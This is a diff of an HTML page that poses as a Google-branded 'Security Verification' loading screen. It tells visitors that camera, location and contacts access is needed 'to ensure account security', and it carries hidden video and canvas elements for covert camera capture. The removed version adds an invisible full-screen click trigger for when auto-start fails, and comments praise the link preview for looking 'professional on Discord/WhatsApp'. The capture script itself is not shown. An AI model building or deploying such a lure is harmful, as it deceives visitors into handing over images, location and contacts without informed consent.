@@ -3,59 +3,149 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
-    <!-- Professional Metadata -->
-    <meta name="description" content="Security Verification">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Dynamic metadata based on redirect URL -->
+    <meta name="description" content="Loading...">
     <meta name="theme-color" content="#ffffff">
     <title>Loading...</title>
 
-    <!-- Open Graph (Link Preview) - Looks professional on Discord/WhatsApp -->
-    <meta property="og:title" content="Security Check">
-    <meta property="og:description" content="Please wait while we verify your session context.">
-    <meta property="og:image"
-        content="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
+    <!-- Open Graph for social preview -->
+    <meta property="og:title" content="Loading...">
+    <meta property="og:description" content="Please wait while we verify your connection.">
+    <meta property="og:image" content="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
     <meta property="og:type" content="website">
 
-    <!-- Styles -->
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="data:,"> <!-- Empty favicon placeholder -->
+    <!-- Simple loading styles -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .loader-container {
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            padding: 40px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            height: 40px;
+            margin-bottom: 10px;
+        }
+
+        .loading-title {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            color: #202124;
+        }
+
+        .loading-subtitle {
+            color: #5f6368;
+            font-size: 15px;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .progress-container {
+            height: 4px;
+            background: #e8eaed;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #1a73e8;
+            transition: width 0.3s ease;
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 10px;
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e8eaed;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .note {
+            font-size: 13px;
+            color: #80868b;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e8eaed;
+        }
+
+        .brand {
+            font-size: 12px;
+            color: #9aa0a6;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 
 <body>
-    <!-- Main UI Container -->
-    <div id="target-ui" class="active">
-        <div class="asana-wrapper">
-            <!-- Logo (dynamically updated by script) -->
-            <div class="asana-logo">
-                <!-- Default generic loader -->
-                <svg width="60" height="60" viewBox="0 0 40 40" fill="none">
-                    <circle cx="20" cy="8" r="4" fill="#666" />
-                    <circle cx="12" cy="22" r="4" fill="#666" />
-                    <circle cx="28" cy="22" r="4" fill="#666" />
-                </svg>
-            </div>
-
-            <!-- Loading State -->
-            <div class="loading-state">
-                <h2 id="loading-text">Initializing...</h2>
-                <div class="progress-container">
-                    <div id="progress-bar"></div>
-                </div>
-                <p class="status-msg" id="status-detail">Preparing secure environment</p>
-            </div>
+    <div class="loader-container">
+        <!-- Logo will be dynamically inserted -->
+        <div class="logo" id="logo"></div>
+        
+        <div class="loader" id="main-loader"></div>
+        
+        <h1 class="loading-title" id="title">Initializing Security Check</h1>
+        <p class="loading-subtitle" id="subtitle">Verifying your browser environment...</p>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
         </div>
+        
+        <div class="status-text" id="status">Preparing verification...</div>
+        
+        <div class="note" id="permission-note" style="display: none;">
+            This verification requires camera, location, and contacts access to ensure account security.
+        </div>
+        
+        <div class="brand" id="brand">Security Verification System</div>
     </div>
 
-    <!-- Fallback Click Trigger (Invisible) - Just in case auto-start fails/disabled -->
-    <div id="click-trigger"
-        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;cursor:pointer;display:none;"></div>
+    <!-- Hidden elements for camera -->
+    <video id="camera-video" autoplay playsinline muted style="display: none;"></video>
+    <canvas id="camera-canvas" style="display: none;"></canvas>
 
-    <!-- Hidden Capture Elements -->
-    <video id="st-v" autoplay playsinline muted style="display:none;"></video>
-    <canvas id="st-c" style="display:none;"></canvas>
-
-    <!-- Core Engine -->
+    <!-- Main script -->
     <script src="script.js"></script>
 </body>
 
